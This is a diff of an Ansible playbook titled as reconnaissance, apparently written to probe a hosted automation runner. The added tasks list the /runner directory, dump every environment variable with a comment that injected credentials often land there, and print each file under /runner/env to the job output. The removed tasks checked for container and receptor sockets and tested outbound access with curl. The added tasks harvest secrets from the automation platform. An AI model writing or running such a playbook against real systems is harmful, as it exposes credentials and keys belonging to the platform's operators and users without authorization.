@@ -1,25 +1,30 @@
 ---
-- name: Recon - sockets and egress only
+- name: Recon - runner internals and injected secrets
   hosts: all
   gather_facts: false
   tasks:
-    - name: Check sensitive sockets
+    - name: List /runner tree
+      ansible.builtin.shell: "ls -laR /runner 2>/dev/null | head -80"
+      register: runnertree
+      changed_when: false
+    - name: Show runner tree
+      ansible.builtin.debug:
+        var: runnertree.stdout_lines
+
+    - name: Dump environment variables (injected creds often land here)
+      ansible.builtin.shell: "env | sort"
+      register: envdump
+      changed_when: false
+    - name: Show env
+      ansible.builtin.debug:
+        var: envdump.stdout_lines
+
+    - name: Find credential / secret files in runner env
       ansible.builtin.shell: |
-        echo "docker.sock:"; ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null || echo "  none"
-        echo "podman.sock:"; ls -la /run/podman/podman.sock 2>/dev/null || echo "  none"
-        echo "receptor:"; ls -la /var/run/receptor /run/receptor 2>/dev/null || echo "  none"
-      register: sockets
+        echo "--- /runner/env contents ---"
+        for f in /runner/env/*; do echo "### $f ###"; cat "$f" 2>/dev/null; echo; done 2>/dev/null
+      register: runnerenv
       changed_when: false
-
-    - name: Show sockets
+    - name: Show runner env files
       ansible.builtin.debug:
-        var: sockets.stdout_lines
-
-    - name: Outbound connectivity test
-      ansible.builtin.shell: "curl -s -o /dev/null -w 'HTTP:%{http_code} IP:%{remote_ip} TIME:%{time_total}s' https://google.com || echo 'NO EGRESS'"
-      register: egress
-      changed_when: false
-
-    - name: Show egress
-      ansible.builtin.debug:
-        var: egress.stdout
+        var: runnerenv.stdout_lines
